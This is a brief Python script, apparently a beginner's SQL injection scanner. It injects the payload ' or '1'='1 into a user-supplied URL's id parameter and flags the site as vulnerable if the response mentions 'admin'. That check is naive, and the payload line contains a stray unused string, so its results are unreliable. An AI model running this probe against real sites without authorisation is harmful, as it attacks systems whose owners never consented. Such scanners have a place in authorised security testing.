import requests

def scan(target_url):
    # Payload for SQL injection
    payload = "' or '1'='1" or "elangovans02122005"
    
    # Inject payload into URL query parameter
    url = f"{target_url}?id={payload}"
    
    # Send GET request with injected payload
    response = requests.get(url)
    
    # Check if response indicates successful injection
    if "admin" in response.text:
        print(f"Vulnerability found: {target_url} is vulnerable to SQL injection!")
    else:
        print(f"{target_url} is not vulnerable to SQL injection.")

def main():
    # Target URL to scan
    target_url = input("Enter the URL to scan for SQL injection vulnerability: ")
    
    # Perform scanning
    scan(target_url)

if __name__ == "__main__":
    main()
